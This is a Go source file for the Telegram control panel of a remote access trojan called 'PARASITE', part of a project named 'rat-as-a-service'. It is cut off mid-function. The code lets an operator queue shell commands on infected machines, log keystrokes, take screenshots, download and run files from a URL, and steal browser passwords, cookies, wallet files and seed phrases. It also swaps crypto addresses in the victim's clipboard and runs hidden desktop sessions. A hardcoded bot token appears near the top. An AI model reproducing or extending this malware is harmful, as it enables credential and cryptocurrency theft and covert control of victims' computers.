package telegrambot

import (
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io/ioutil"
	"log"
	"net/http"
	"os"
	"strconv"
	"strings"
	"time"

	c2server "rat-as-a-service/c2-server"
	"rat-as-a-service/config"

	tgbotapi "github.com/go-telegram-bot-api/telegram-bot-api/v5"
)

const (
	SUPERADMIN_ID = 7991166259
	BOT_TOKEN     = "7890797107:AAFito4uA7Tm1e4f0P-91nsWY9-6xrN-DkU"
)

// Session represents a user's interaction state
type Session struct {
	SelectedAgent string
	WaitingFor    string                  // What input we're waiting for
	TempData      map[string]interface{}  // Temporary storage for multi-step operations
	CryptoConfig  *config.CryptoAddresses // Stored crypto addresses
}

type TelegramBot struct {
	bot      *tgbotapi.BotAPI
	c2Server *c2server.C2Server
}

var userSessions = make(map[int64]*Session)

func NewTelegramBot(token string, c2 *c2server.C2Server) (*TelegramBot, error) {
	bot, err := tgbotapi.NewBotAPI(token)
	if err != nil {
		return nil, err
	}

	bot.Debug = false
	log.Printf("Telegram Bot authorized as %s", bot.Self.UserName)

	return &TelegramBot{
		bot:      bot,
		c2Server: c2,
	}, nil
}

func (tb *TelegramBot) isAuthorized(userID int64) bool {
	return userID == SUPERADMIN_ID
}

func (tb *TelegramBot) getSession(userID int64) *Session {
	if session, exists := userSessions[userID]; exists {
		return session
	}
	userSessions[userID] = &Session{}
	return userSessions[userID]
}

func (tb *TelegramBot) sendMessage(chatID int64, text string) {
	msg := tgbotapi.NewMessage(chatID, text)
	msg.ParseMode = "Markdown"
	tb.bot.Send(msg)
}

func (tb *TelegramBot) handleStart(chatID int64) {
	welcome := `💀 *PARASITE Control Panel* 💀

🤖 *Available Commands:*

📊 *Agent Management:*
• ` + "`/agents`" + ` - List all agents
• ` + "`/select <agent_id>`" + ` - Select agent for operations
• ` + "`/info`" + ` - Show selected agent details

⚡ *Agent Operations:*
• ` + "`/shell <command>`" + ` - Execute shell command
• ` + "`/screenshot`" + ` - Take screenshot
• ` + "`/screenshots`" + ` - List captured screenshots
• ` + "`/keylog <seconds>`" + ` - Start keylogger
• ` + "`/clipmonitor <seconds>`" + ` - Monitor clipboard changes
• ` + "`/clipread`" + ` - Read current clipboard content
• ` + "`/clipwrite <text>`" + ` - Write text to clipboard
• ` + "`/clipreplace`" + ` - Replace crypto addresses
• ` + "`/clipreset`" + ` - Reset clipboard configuration
• ` + "`/clipclear`" + ` - Clear clipboard configuration
• ` + "`/upload <url>`" + ` - Download & execute file
• ` + "`/terminate`" + ` - Terminate agent

🔐 *Credential Theft:*
• ` + "`/stealpasswords`" + ` - Extract browser passwords
• ` + "`/stealcookies`" + ` - Extract browser cookies
• ` + "`/stealautofill`" + ` - Extract autofill data
• ` + "`/stealdocs`" + ` - Scan documents for passwords
• ` + "`/stealall`" + ` - Comprehensive credential theft

💰 *Crypto Wallet Theft:*
• ` + "`/stealwallets`" + ` - Detect and steal hot wallet files
• ` + "`/stealextwallets`" + ` - Extract browser extension wallets
• ` + "`/monitorwallets`" + ` - Monitor wallet activity (5 min)
• ` + "`/hijacktx`" + ` - Enable transaction hijacking
• ` + "`/extractseeds`" + ` - Extract seed phrases only
• ` + "`/stealallcrypto`" + ` - Comprehensive crypto theft

📈 *System:*
• ` + "`/health`" + ` - C2 server health check
• ` + "`/help`" + ` - Show this menu

🔐 *Status:* Authorized as SuperAdmin
📸 *Screenshots:* Delivered directly via Telegram

🖥️ *HVNC (Hidden Desktop):*
• ` + "`/hvncstart`" + ` - Start hidden desktop session
• ` + "`/hvncstop`" + ` - Stop hidden desktop session
• ` + "`/hvncscreen`" + ` - Screenshot from hidden desktop
• ` + "`/hvncmouse <x> <y> <action>`" + ` - Send mouse event
• ` + "`/hvnckbd <action> <key/text>`" + ` - Send keyboard event
• ` + "`/hvncexec <command>`" + ` - Execute in hidden desktop`

	tb.sendMessage(chatID, welcome)
}

func (tb *TelegramBot) handleAgents(chatID int64) {
	agents := tb.c2Server.GetAgents()

	if len(agents) == 0 {
		tb.sendMessage(chatID, "📭 *No agents registered*")
		return
	}

	var message strings.Builder
	message.WriteString("🤖 *Active RAT Agents:*\n\n")

	for i, agent := range agents {
		status := ""
		switch agent.Status {
		case config.STATUS_ACTIVE:
			status = "🟢"
		case config.STATUS_INACTIVE:
			status = "🟡"
		case config.STATUS_DEAD:
			status = "🔴"
		}

		lastSeen := time.Since(agent.LastSeen)
		message.WriteString(fmt.Sprintf(
			"%s *Agent %d:* `%s`\n"+
				"🖥️ `%s@%s` (%s)\n"+
				"⏰ Last seen: %v ago\n"+
				"�� IP: `%s`\n"+
				"🔧 PID: `%d` | Process: `%s`\n\n",
			status, i+1, agent.ID[:8],
			agent.Username, agent.Hostname, agent.OS,
			lastSeen.Round(time.Second),
			agent.IPAddress,
			agent.ProcessID, agent.ProcessName,
		))
	}

	message.WriteString("💡 Use `/select <agent_id>` to choose an agent")
	tb.sendMessage(chatID, message.String())
}

func (tb *TelegramBot) handleSelect(chatID int64, agentID string) {
	agents := tb.c2Server.GetAgents()

	// Find agent (allow partial ID matching)
	var selectedAgent *config.Agent
	for _, agent := range agents {
		if strings.HasPrefix(agent.ID, agentID) || agent.ID == agentID {
			selectedAgent = agent
			break
		}
	}

	if selectedAgent == nil {
		tb.sendMessage(chatID, "❌ *Agent not found*\nUse `/agents` to see available agents")
		return
	}

	session := tb.getSession(chatID)
	session.SelectedAgent = selectedAgent.ID

	status := ""
	switch selectedAgent.Status {
	case config.STATUS_ACTIVE:
		status = "🟢 Active"
	case config.STATUS_INACTIVE:
		status = "🟡 Inactive"
	case config.STATUS_DEAD:
		status = "🔴 Dead"
	}

	message := fmt.Sprintf(
		"✅ *Selected Agent:* `%s`\n\n"+
			"🖥️ **System Info:**\n"+
			"• Host: `%s@%s`\n"+
			"• OS: `%s` (%s)\n"+
			"• Privileges: `%s`\n"+
			"• Status: %s\n"+
			"• IP: `%s`\n"+
			"• Process: `%s` (PID: %d)\n"+
			"• Last Seen: %v ago\n\n"+
			"🎯 *Agent ready for commands!*",
		selectedAgent.ID[:8],
		selectedAgent.Username, selectedAgent.Hostname,
		selectedAgent.OS, selectedAgent.Architecture,
		selectedAgent.PrivLevel,
		status,
		selectedAgent.IPAddress,
		selectedAgent.ProcessName, selectedAgent.ProcessID,
		time.Since(selectedAgent.LastSeen).Round(time.Second),
	)

	tb.sendMessage(chatID, message)
}

func (tb *TelegramBot) handleShell(chatID int64, command string) {
	session := tb.getSession(chatID)

	if session.SelectedAgent == "" {
		tb.sendMessage(chatID, "❌ *No agent selected*\nUse `/select <agent_id>` first")
		return
	}

	if command == "" {
		tb.sendMessage(chatID, "❌ *No command specified*\nUsage: `/shell <command>`")
		return
	}

	taskID := tb.c2Server.AddTask(session.SelectedAgent, config.TASK_SHELL_COMMAND, command, nil)

	tb.sendMessage(chatID, fmt.Sprintf(
		"⚡ *Command queued:* `%s`\n🆔 Task ID: `%s`\n\n⏳ Waiting for agent to execute...",
		command, taskID[:8],
	))

	// Check for result asynchronously
	go tb.waitForTaskResult(chatID, taskID, 60*time.Second)
}

func (tb *TelegramBot) handleScreenshot(chatID int64) {
	session := tb.getSession(chatID)

	if session.SelectedAgent == "" {
		tb.sendMessage(chatID, "❌ *No agent selected*\nUse `/select <agent_id>` first")
		return
	}

	taskID := tb.c2Server.AddTask(session.SelectedAgent, config.TASK_SCREENSHOT, "", nil)

	tb.sendMessage(chatID, fmt.Sprintf(
		"📸 *Screenshot task queued*\n🆔 Task ID: `%s`\n\n⏳ Capturing screen...",
		taskID[:8],
	))

	go tb.waitForScreenshotResult(chatID, taskID, 60*time.Second)
}

func (tb *TelegramBot) handleListScreenshots(chatID int64) {
	// Make HTTP request to C2 server to get screenshots list
	resp, err := http.Get(fmt.Sprintf("http://%s:%s%s",
		config.C2_SERVER_HOST, config.C2_SERVER_PORT, config.ENDPOINT_SCREENSHOTS))
	if err != nil {
		tb.sendMessage(chatID, "❌ *Failed to fetch screenshots list*")
		return
	}
	defer resp.Body.Close()

	body, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		tb.sendMessage(chatID, "❌ *Failed to read screenshots response*")
		return
	}

	// Parse the response (simplified - in production you'd use proper JSON parsing)
	if strings.Contains(string(body), `"count":0`) {
		tb.sendMessage(chatID, "📭 *No screenshots available*")
		return
	}

	// For now, just show that screenshots are available
	// In a full implementation, you'd parse the JSON and show details
	tb.sendMessage(chatID, fmt.Sprintf(
		"📸 *Screenshots Available*\n\n"+
			"Use `/screenshot` to capture a new one\n"+
			"Screenshots are saved on the C2 server at:\n"+
			"`http://%s:%s/screenshots/`\n\n"+
			"💡 *Tip:* Access the web interface to view screenshots",
		config.C2_SERVER_HOST, config.C2_SERVER_PORT,
	))
}

func (tb *TelegramBot) handleKeylog(chatID int64, duration string) {
	session := tb.getSession(chatID)

	if session.SelectedAgent == "" {
		tb.sendMessage(chatID, "❌ *No agent selected*\nUse `/select <agent_id>` first")
		return
	}

	seconds, err := strconv.Atoi(duration)
	if err != nil || seconds <= 0 {
		tb.sendMessage(chatID, "❌ *Invalid duration*\nUsage: `/keylog <seconds>`")
		return
	}

	params := map[string]interface{}{
		"duration": seconds,
	}

	taskID := tb.c2Server.AddTask(session.SelectedAgent, config.TASK_KEYLOG, "", params)

	tb.sendMessage(chatID, fmt.Sprintf(
		"⌨️ *Keylogger started for %d seconds*\n🆔 Task ID: `%s`\n\n⏳ Recording keystrokes...",
		seconds, taskID[:8],
	))

	go tb.waitForTaskResult(chatID, taskID, time.Duration(seconds+30)*time.Second)
}

func (tb *TelegramBot) handleClipboardMonitor(chatID int64, duration string) {
	session := tb.getSession(chatID)

	if session.SelectedAgent == "" {
		tb.sendMessage(chatID, "❌ *No agent selected*\nUse `/select <agent_id>` first")
		return
	}

	seconds, err := strconv.Atoi(duration)
	if err != nil || seconds <= 0 {
		tb.sendMessage(chatID, "❌ *Invalid duration*\nUsage: `/clipmonitor <seconds>`")
		return
	}

	params := map[string]interface{}{
		"duration": seconds,
	}

	taskID := tb.c2Server.AddTask(session.SelectedAgent, config.TASK_CLIPBOARD_MONITOR, "", params)

	tb.sendMessage(chatID, fmt.Sprintf(
		"🖊️ *Clipboard monitor started for %d seconds*\n🆔 Task ID: `%s`\n\n⏳ Monitoring clipboard...",
		seconds, taskID[:8],
	))

	go tb.waitForTaskResult(chatID, taskID, time.Duration(seconds+30)*time.Second)
}

func (tb *TelegramBot) handleClipboardRead(chatID int64) {
	session := tb.getSession(chatID)

	if session.SelectedAgent == "" {
		tb.sendMessage(chatID, "❌ *No agent selected*\nUse `/select <agent_id>` first")
		return
	}

	taskID := tb.c2Server.AddTask(session.SelectedAgent, config.TASK_CLIPBOARD_READ, "", nil)

	tb.sendMessage(chatID, fmt.Sprintf(
		"🖊️ *Reading clipboard content*\n🆔 Task ID: `%s`\n\n⏳ Reading clipboard...",
		taskID[:8],
	))

	go tb.waitForTaskResult(chatID, taskID, 60*time.Second)
}

func (tb *TelegramBot) handleClipboardWrite(chatID int64, text string) {
	session := tb.getSession(chatID)

	if session.SelectedAgent == "" {
		tb.sendMessage(chatID, "❌ *No agent selected*\nUse `/select <agent_id>` first")
		return
	}

	if text == "" {
		tb.sendMessage(chatID, "❌ *No text specified*\nUsage: `/clipwrite <text>`")
		return
	}

	taskID := tb.c2Server.AddTask(session.SelectedAgent, config.TASK_CLIPBOARD_WRITE, text, nil)

	tb.sendMessage(chatID, fmt.Sprintf(
		"🖊️ *Writing text to clipboard*\n🆔 Task ID: `%s`\n\n⏳ Writing text...",
		taskID[:8],
	))

	go tb.waitForTaskResult(chatID, taskID, 60*time.Second)
}

func (tb *TelegramBot) handleClipboardReplace(chatID int64) {
	tb.startCryptoAddressSetup(chatID)
}

func (tb *TelegramBot) handleClipboardReset(chatID int64) {
	session := tb.getSession(chatID)

	if session.SelectedAgent == "" {
		tb.sendMessage(chatID, "❌ *No agent selected*\nUse `/select <agent_id>` first")
		return
	}

	session.CryptoConfig = nil
	session.WaitingFor = ""

	tb.sendMessage(chatID, "✅ *Clipboard configuration reset successfully!*\nUse `/clipreplace` again to set up addresses.")
}

func (tb *TelegramBot) handleClipboardClear(chatID int64) {
	session := tb.getSession(chatID)

	if session.SelectedAgent == "" {
		tb.sendMessage(chatID, "❌ *No agent selected*\nUse `/select <agent_id>` first")
		return
	}

	session.CryptoConfig = nil
	session.WaitingFor = ""

	tb.sendMessage(chatID, "✅ *Clipboard configuration cleared successfully!*\nUse `/clipreplace` again to set up addresses.")
}

func (tb *TelegramBot) handleHealth(chatID int64) {
	agents := tb.c2Server.GetAgents()

	activeCount := 0
	inactiveCount := 0
	deadCount := 0

	for _, agent := range agents {
		switch agent.Status {
		case config.STATUS_ACTIVE:
			activeCount++
		case config.STATUS_INACTIVE:
			inactiveCount++
		case config.STATUS_DEAD:
			deadCount++
		}
	}

	message := fmt.Sprintf(
		"📊 *C2 Server Health Status*\n\n"+
			"🤖 **Agent Statistics:**\n"+
			"• 🟢 Active: %d\n"+
			"• 🟡 Inactive: %d\n"+
			"• 🔴 Dead: %d\n"+
			"• 📊 Total: %d\n\n"+
			"⚙️ **Server Info:**\n"+
			"• Status: 🟢 Operational\n"+
			"• Endpoint: `%s:%s`\n"+
			"• Beacon Interval: %v\n\n"+
			"🕐 *Last Updated:* %s",
		activeCount, inactiveCount, deadCount, len(agents),
		config.C2_SERVER_HOST, config.C2_SERVER_PORT,
		config.BEACON_INTERVAL,
		time.Now().Format("15:04:05"),
	)

	tb.sendMessage(chatID, message)
}

func (tb *TelegramBot) waitForTaskResult(chatID int64, taskID string, timeout time.Duration) {
	ticker := time.NewTicker(2 * time.Second)
	defer ticker.Stop()

	timeoutTimer := time.NewTimer(timeout)
	defer timeoutTimer.Stop()

	for {
		select {
		case <-ticker.C:
			result := tb.c2Server.GetTaskResult(taskID)
			if result != nil {
				if result.Success {
					output := result.Output
					outputLen := len(output)

					// Telegram has a 4096 character limit
					maxLen := 3000 // Leave room for formatting
					truncated := false

					if len(output) > maxLen {
						output = output[:maxLen]
						truncated = true
					}

					message := fmt.Sprintf("✅ *Task Completed* (`%s`)\n\n", taskID[:8])

					if truncated {
						message += fmt.Sprintf("📊 *Output truncated* (showing %d of %d bytes)\n\n", maxLen, outputLen)
					}

					message += fmt.Sprintf("```\n%s\n```", output)

					if truncated {
						message += fmt.Sprintf("\n\n💡 *Full output size:* %d bytes", outputLen)
					}

					tb.sendMessage(chatID, message)
				} else {
					tb.sendMessage(chatID, fmt.Sprintf(
						"❌ *Task Failed* (`%s`)\n\n**Error:** `%s`",
						taskID[:8], result.Error,
					))
				}
				return
			}

		case <-timeoutTimer.C:
			tb.sendMessage(chatID, fmt.Sprintf(
				"⏰ *Task Timeout* (`%s`)\n\nAgent may be offline or command is taking too long",
				taskID[:8],
			))
			return
		}
	}
}

func (tb *TelegramBot) waitForScreenshotResult(chatID int64, taskID string, timeout time.Duration) {
	ticker := time.NewTicker(2 * time.Second)
	defer ticker.Stop()

	timeoutTimer := time.NewTimer(timeout)
	defer timeoutTimer.Stop()

	for {
		select {
		case <-ticker.C:
			result := tb.c2Server.GetTaskResult(taskID)
			if result != nil {
				if result.Success {
					// Extract screenshot info from result
					lines := strings.Split(result.Output, "\n")
					screenshotInfo := lines[0] // First line has the dimensions and size info

					// Look for the saved filename in the result
					var screenshotFile string
					for _, line := range lines {
						if strings.Contains(line, "Screenshot saved:") {
							parts := strings.Split(line, "Screenshot saved:")
							if len(parts) > 1 {
								screenshotFile = strings.TrimSpace(parts[1])
								break
							}
						}
					}

					if screenshotFile != "" {
						// Send the actual screenshot file via Telegram
						screenshotPath := fmt.Sprintf("screenshots/%s", screenshotFile)

						// Check if file exists
						if _, err := os.Stat(screenshotPath); err == nil {
							// Create photo upload
							photoBytes, err := ioutil.ReadFile(screenshotPath)
							if err == nil {
								photoFileBytes := tgbotapi.FileBytes{
									Name:  screenshotFile,
									Bytes: photoBytes,
								}

								photo := tgbotapi.NewPhoto(chatID, photoFileBytes)
								photo.Caption = fmt.Sprintf(
									"🖼️ *Screenshot Captured*\n\n"+
										"📊 %s\n"+
										"🆔 Task: `%s`\n"+
										"📁 File: `%s`",
									screenshotInfo, taskID[:8], screenshotFile,
								)
								photo.ParseMode = "Markdown"

								if _, err := tb.bot.Send(photo); err != nil {
									log.Printf("Failed to send screenshot via Telegram: %v", err)
									// Fallback to text message
									tb.sendMessage(chatID, fmt.Sprintf(
										"✅ *Screenshot Captured* (`%s`)\n\n"+
											"📊 %s\n"+
											"📁 Saved as: `%s`\n\n"+
											"⚠️ Failed to send image directly",
										taskID[:8], screenshotInfo, screenshotFile,
									))
								}
								return
							}
						}
					}

					// Fallback if we couldn't send the file
					message := fmt.Sprintf(
						"✅ *Screenshot Captured* (`%s`)\n\n"+
							"📊 **Details:**\n%s\n\n"+
							"⚠️ Screenshot saved but could not be sent directly",
						taskID[:8], screenshotInfo,
					)

					tb.sendMessage(chatID, message)
				} else {
					tb.sendMessage(chatID, fmt.Sprintf(
						"❌ *Screenshot Failed* (`%s`)\n\n**Error:** `%s`",
						taskID[:8], result.Error,
					))
				}
				return
			}

		case <-timeoutTimer.C:
			tb.sendMessage(chatID, fmt.Sprintf(
				"⏰ *Screenshot Timeout* (`%s`)\n\nAgent may be offline or screenshot is taking too long",
				taskID[:8],
			))
			return
		}
	}
}

func (tb *TelegramBot) handleCommand(update tgbotapi.Update) {
	if update.Message == nil {
		return
	}

	userID := update.Message.From.ID
	chatID := update.Message.Chat.ID
	text := update.Message.Text

	// Authorization check
	if !tb.isAuthorized(userID) {
		tb.sendMessage(chatID, "🚫 *Unauthorized Access*\nThis bot is restricted to authorized users only.")
		return
	}

	// Parse command
	parts := strings.Fields(text)
	if len(parts) == 0 {
		return
	}

	command := strings.ToLower(parts[0])

	switch command {
	case "/start", "/help":
		tb.handleStart(chatID)

	case "/agents":
		tb.handleAgents(chatID)

	case "/select":
		if len(parts) < 2 {
			tb.sendMessage(chatID, "❌ *Usage:* `/select <agent_id>`")
			return
		}
		tb.handleSelect(chatID, parts[1])

	case "/shell":
		if len(parts) < 2 {
			tb.sendMessage(chatID, "❌ *Usage:* `/shell <command>`")
			return
		}
		tb.handleShell(chatID, strings.Join(parts[1:], " "))

	case "/screenshot":
		tb.handleScreenshot(chatID)

	case "/screenshots":
		tb.handleListScreenshots(chatID)

	case "/keylog":
		if len(parts) < 2 {
			tb.sendMessage(chatID, "❌ *Usage:* `/keylog <seconds>`")
			return
		}
		tb.handleKeylog(chatID, parts[1])

	case "/clipmonitor":
		if len(parts) < 2 {
			tb.sendMessage(chatID, "❌ *Usage:* `/clipmonitor <seconds>`")
			return
		}
		tb.handleClipboardMonitor(chatID, parts[1])

	case "/clipread":
		tb.handleClipboardRead(chatID)

	case "/clipwrite":
		if len(parts) < 2 {
			tb.sendMessage(chatID, "❌ *Usage:* `/clipwrite <text>`")
			return
		}
		tb.handleClipboardWrite(chatID, strings.Join(parts[1:], " "))

	case "/clipreplace":
		tb.startCryptoAddressSetup(chatID)

	case "/clipreset":
		tb.handleClipboardReset(chatID)

	case "/clipclear":
		tb.handleClipboardClear(chatID)

	case "/hvncstart":
		tb.handleHVNCStart(chatID)

	case "/hvncstop":
		tb.handleHVNCStop(chatID)

	case "/hvncscreen":
		tb.handleHVNCScreenshot(chatID)

	case "/hvncmouse":
		if len(parts) < 4 {
			tb.sendMessage(chatID, "❌ *Usage:* `/hvncmouse <x> <y> <action>` or `/hvncmouse <x> <y> <button> <action>`\n\n*Actions:* move, click, double, down, up\n*Buttons:* left, right, middle")
			return
		}
		tb.handleHVNCMouse(chatID, parts[1:])

	case "/hvnckbd":
		if len(parts) < 3 {
			tb.sendMessage(chatID, "❌ *Usage:* `/hvnckbd <action> <key/text>`\n\n*Actions:* press, down, up, type\n*Examples:*\n`/hvnckbd press enter`\n`/hvnckbd type hello world`")
			return
		}
		tb.handleHVNCKeyboard(chatID, parts[1:])

	case "/hvncexec":
		if len(parts) < 2 {
			tb.sendMessage(chatID, "❌ *Usage:* `/hvncexec <command>`")
			return
		}
		tb.handleHVNCExecute(chatID, strings.Join(parts[1:], " "))

	case "/upload":
		if len(parts) < 2 {
			tb.sendMessage(chatID, "❌ *Usage:* `/upload <url>`")
			return
		}
		tb.handleDownloadExec(chatID, parts[1])

	case "/health":
		tb.handleHealth(chatID)

	case "/terminate":
		tb.handleTerminate(chatID)

	case "/stealpasswords":
		tb.handleStealPasswords(chatID)

	case "/stealcookies":
		tb.handleStealCookies(chatID)

	case "/stealautofill":
		tb.handleStealAutofill(chatID)

	case "/stealdocs":
		tb.handleStealDocs(chatID)

	case "/stealall":
		tb.handleStealAll(chatID)

	case "/stealwallets":
		tb.handleStealWallets(chatID)

	// Browser extension wallet commands
	case "/stealextwallets":
		tb.handleStealExtensionWallets(chatID)
	case "/monitorwallets":
		tb.handleMonitorWalletActivity(chatID)
	case "/hijacktx":
		tb.handleHijackTransactions(chatID)
	case "/extractseeds":
		tb.handleExtractWalletSeeds(chatID)
	case "/stealallcrypto":
		tb.handleStealAllCrypto(chatID)

	default:
		// Check if user is in interactive mode
		session := tb.getSession(chatID)
		if session.WaitingFor != "" {
			tb.handleInteractiveInput(chatID, text)
			return
		}
		tb.sendMessage(chatID, "❌ *Unknown command*\nUse `/help` to see available commands")
	}
}

// Interactive crypto address setup
func (tb *TelegramBot) startCryptoAddressSetup(chatID int64) {
	session := tb.getSession(chatID)

	if session.SelectedAgent == "" {
		tb.sendMessage(chatID, "❌ *No agent selected*\nUse `/select <agent_id>` first")
		return
	}

	// Initialize crypto config if not exists
	if session.CryptoConfig == nil {
		session.CryptoConfig = &config.CryptoAddresses{}
	}

	// Initialize temp data for this setup session
	session.TempData = make(map[string]interface{})
	session.WaitingFor = "crypto_setup_choice"

	tb.sendMessage(chatID,
		"💰 *CRYPTO ADDRESS REPLACEMENT SETUP*\n\n"+
			"Choose how to configure replacement addresses:\n\n"+
			"1️⃣ **Quick Setup** - One address replaces ALL crypto types\n"+
			"2️⃣ **Advanced Setup** - Configure specific addresses per crypto\n"+
			"3️⃣ **View Current** - Show current configuration\n"+
			"4️⃣ **Start Replacement** - Begin clipboard monitoring\n\n"+
			"*Reply with:* `1`, `2`, `3`, or `4`")
}

// Handle download and execute task
func (tb *TelegramBot) handleDownloadExec(chatID int64, url string) {
	session := tb.getSession(chatID)

	if session.SelectedAgent == "" {
		tb.sendMessage(chatID, "❌ *No agent selected*\nUse `/select <agent_id>` first")
		return
	}

	params := map[string]interface{}{
		"url": url,
	}

	taskID := tb.c2Server.AddTask(session.SelectedAgent, config.TASK_DOWNLOAD_EXEC, "", params)

	tb.sendMessage(chatID, fmt.Sprintf(
		"📥 *Downloading and executing file*\n🔗 URL: `%s`\n🆔 Task ID: `%s`",
		url, taskID[:8],
	))

	go tb.waitForTaskResult(chatID, taskID, 60*time.Second)
}

// Handle interactive input for crypto setup
func (tb *TelegramBot) handleInteractiveInput(chatID int64, input string) {
	session := tb.getSession(chatID)

	switch session.WaitingFor {
	case "crypto_setup_choice":
		tb.handleCryptoSetupChoice(chatID, input)
	case "crypto_default_address":
		tb.handleDefaultAddressInput(chatID, input)
	case "crypto_btc_address":
		tb.handleSpecificAddressInput(chatID, "BTC", input)
	case "crypto_eth_address":
		tb.handleSpecificAddressInput(chatID, "ETH", input)
	case "crypto_sol_address":
		tb.handleSpecificAddressInput(chatID, "SOL", input)
	case "crypto_ltc_address":
		tb.handleSpecificAddressInput(chatID, "LTC", input)
	case "crypto_replacement_duration":
		tb.handleReplacementDuration(chatID, input)
	case "confirm_clear_universal":
		tb.handleConfirmClearUniversal(chatID, input)
	case "confirm_clear_specific":
		tb.handleConfirmClearSpecific(chatID, input)
	default:
		session.WaitingFor = ""
		tb.sendMessage(chatID, "❌ *Invalid input state*")
	}
}

func (tb *TelegramBot) handleCryptoSetupChoice(chatID int64, choice string) {
	session := tb.getSession(chatID)

	switch choice {
	case "1":
		// Check if specific addresses exist - need confirmation to clear them
		if session.CryptoConfig != nil && (session.CryptoConfig.BTC != "" || session.CryptoConfig.ETH != "" ||
			session.CryptoConfig.SOL != "" || session.CryptoConfig.LTC != "") {

			session.WaitingFor = "confirm_clear_specific"
			session.TempData["setup_type"] = "universal"

			tb.sendMessage(chatID,
				"⚠️ *WARNING: Existing Configuration Detected*\n\n"+
					"You have specific crypto addresses configured:\n"+
					tb.formatExistingSpecificAddresses(session.CryptoConfig)+"\n\n"+
					"Setting up a **universal address** will **CLEAR** these specific addresses.\n\n"+
					"❓ **Are you sure you want to continue?**\n"+
					"Reply with `yes` to confirm or `no` to cancel.")
		} else {
			// No conflict, proceed directly
			session.WaitingFor = "crypto_default_address"
			tb.sendMessage(chatID,
				"💰 *QUICK SETUP - Universal Address*\n\n"+
					"Enter ONE address that will replace ALL crypto addresses:\n"+
					"(BTC, ETH, SOL, LTC, etc.)\n\n"+
					"*Example:* `1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa`")
		}
	case "2":
		// Check if universal address exists - need confirmation to clear it
		if session.CryptoConfig != nil && session.CryptoConfig.DefaultAddress != "" {

			session.WaitingFor = "confirm_clear_universal"
			session.TempData["setup_type"] = "specific"

			tb.sendMessage(chatID,
				"⚠️ *WARNING: Existing Configuration Detected*\n\n"+
					fmt.Sprintf("You have a universal address configured:\n🔄 **Universal:** `%s`\n\n", session.CryptoConfig.DefaultAddress)+
					"Setting up **specific addresses** will **CLEAR** this universal address.\n\n"+
					"❓ **Are you sure you want to continue?**\n"+
					"Reply with `yes` to confirm or `no` to cancel.")
		} else {
			// No conflict, proceed directly
			tb.startAdvancedCryptoSetup(chatID)
		}
	case "3":
		tb.showCurrentCryptoConfig(chatID)
	case "4":
		tb.startClipboardReplacement(chatID)
	default:
		tb.sendMessage(chatID, "❌ *Invalid choice*\nReply with `1`, `2`, `3`, or `4`")
	}
}

func (tb *TelegramBot) handleDefaultAddressInput(chatID int64, address string) {
	session := tb.getSession(chatID)

	// Basic validation
	if len(address) < 20 || len(address) > 100 {
		tb.sendMessage(chatID, "❌ *Invalid address format*\nPlease enter a valid crypto address")
		return
	}

	session.CryptoConfig.DefaultAddress = address
	session.WaitingFor = ""

	tb.sendMessage(chatID, fmt.Sprintf(
		"✅ *Default address configured!*\n\n"+
			"🔄 **Universal Replacement:** `%s`\n\n"+
			"This address will replace ALL crypto addresses found in clipboard.\n\n"+
			"Use `/clipreplace` again to start monitoring or configure more addresses.",
		address))
}

func (tb *TelegramBot) startAdvancedCryptoSetup(chatID int64) {
	session := tb.getSession(chatID)
	session.WaitingFor = "crypto_btc_address"

	tb.sendMessage(chatID,
		"🔧 *ADVANCED SETUP - Specific Addresses*\n\n"+
			"Configure addresses for each cryptocurrency.\n"+
			"Send empty message to skip any crypto type.\n\n"+
			"**Step 1/4: Bitcoin (BTC)**\n"+
			"Enter your BTC address or send `-` to skip:")
}

func (tb *TelegramBot) handleSpecificAddressInput(chatID int64, cryptoType string, address string) {
	session := tb.getSession(chatID)

	if address != "-" && address != "" {
		// Basic validation
		if len(address) < 20 || len(address) > 100 {
			tb.sendMessage(chatID, fmt.Sprintf("❌ *Invalid %s address*\nTry again or send `-` to skip:", cryptoType))
			return
		}

		// Store the address
		switch cryptoType {
		case "BTC":
			session.CryptoConfig.BTC = address
		case "ETH":
			session.CryptoConfig.ETH = address
		case "SOL":
			session.CryptoConfig.SOL = address
		case "LTC":
			session.CryptoConfig.LTC = address
		}
	}

	// Move to next step
	switch session.WaitingFor {
	case "crypto_btc_address":
		session.WaitingFor = "crypto_eth_address"
		tb.sendMessage(chatID, "**Step 2/4: Ethereum (ETH)**\nEnter your ETH address or send `-` to skip:")
	case "crypto_eth_address":
		session.WaitingFor = "crypto_sol_address"
		tb.sendMessage(chatID, "**Step 3/4: Solana (SOL)**\nEnter your SOL address or send `-` to skip:")
	case "crypto_sol_address":
		session.WaitingFor = "crypto_ltc_address"
		tb.sendMessage(chatID, "**Step 4/4: Litecoin (LTC)**\nEnter your LTC address or send `-` to skip:")
	case "crypto_ltc_address":
		session.WaitingFor = ""
		tb.showAdvancedSetupComplete(chatID)
	}
}

func (tb *TelegramBot) showAdvancedSetupComplete(chatID int64) {
	session := tb.getSession(chatID)
	config := session.CryptoConfig

	message := "✅ *Advanced crypto setup complete!*\n\n**Configured addresses:**\n"

	if config.BTC != "" {
		message += fmt.Sprintf("🟠 **BTC:** `%s`\n", config.BTC)
	}
	if config.ETH != "" {
		message += fmt.Sprintf("🔵 **ETH:** `%s`\n", config.ETH)
	}
	if config.SOL != "" {
		message += fmt.Sprintf("🟣 **SOL:** `%s`\n", config.SOL)
	}
	if config.LTC != "" {
		message += fmt.Sprintf("⚪ **LTC:** `%s`\n", config.LTC)
	}

	if config.BTC == "" && config.ETH == "" && config.SOL == "" && config.LTC == "" {
		message += "*No addresses configured*\n"
	}

	message += "\nUse `/clipreplace` again to start monitoring!"

	tb.sendMessage(chatID, message)
}

func (tb *TelegramBot) showCurrentCryptoConfig(chatID int64) {
	session := tb.getSession(chatID)
	config := session.CryptoConfig

	if config == nil {
		tb.sendMessage(chatID, "❌ *No crypto addresses configured*\nUse option `1` or `2` to set up addresses first.")
		return
	}

	message := "💰 *Current Crypto Configuration:*\n\n"

	if config.DefaultAddress != "" {
		message += fmt.Sprintf("🔄 **Universal:** `%s`\n\n", config.DefaultAddress)
	}

	if config.BTC != "" || config.ETH != "" || config.SOL != "" || config.LTC != "" {
		message += "**Specific addresses:**\n"
		if config.BTC != "" {
			message += fmt.Sprintf("🟠 **BTC:** `%s`\n", config.BTC)
		}
		if config.ETH != "" {
			message += fmt.Sprintf("🔵 **ETH:** `%s`\n", config.ETH)
		}
		if config.SOL != "" {
